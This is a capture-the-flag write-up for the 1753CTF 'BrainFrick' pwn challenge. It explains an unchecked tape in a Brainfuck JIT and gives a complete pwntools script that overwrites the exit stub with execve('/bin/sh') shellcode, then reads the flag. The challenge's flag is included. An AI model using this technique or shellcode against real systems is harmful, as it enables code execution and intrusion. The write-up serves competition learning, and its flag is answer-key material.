https://ctftime.org/event/2234/

# BrainFrick ~ PWN

Brainfuck is cool, but interpreters written in js are slow, we need performance!

nc 140.238.91.110 42303

https://dl.1753ctf.com/brain-frick?s=rfESHXpu

## Solution

We can see from the code in `brainfrick.cpp` that:

- If we supply brainfuck source code it will jit compiled into x64
- The data section, or tape, is directly after the code section
    - This means that rip will execute from the data section after the code section

We can see that the following sequence of bytes will be appended to our code:

```
const vector<byte> compiled_end = {
    0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, // mov rax, 0x3c
    0x0F, 0x05 // syscall (exit())
};
```

To prevent the program from exiting, and to start to execute the bytes in the data section, we must overwrite these bytes with the start of our shellcode.

In order to this we need to wind the data pointer back 9 bytes and modify the values of theose 9 bytes to be the first 9 bytes of our shellcode.

```
from pwn import *

REMOTE_IP = "140.238.91.110"
REMOTE_PORT = 36369

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Enter your code:\n")

compiled_end = b"\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"

shellcode = b"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = b""
for i in range(len(compiled_end)):
    payload += b"<"

for i in range(len(compiled_end)):
    payload += b"+" * (int(shellcode[i]) - int(compiled_end[i]) & 0xff)
    payload += b">"

for b in shellcode[len(compiled_end):]:
    payload += b"+" * int(b)
    payload += b">"

p.sendline(payload)

p.clean()

p.sendline(b"/bin/cat /flag")

p.interactive()
```

## Flag
`1753c{bounds_not_checked_brain_is_a_frick}`
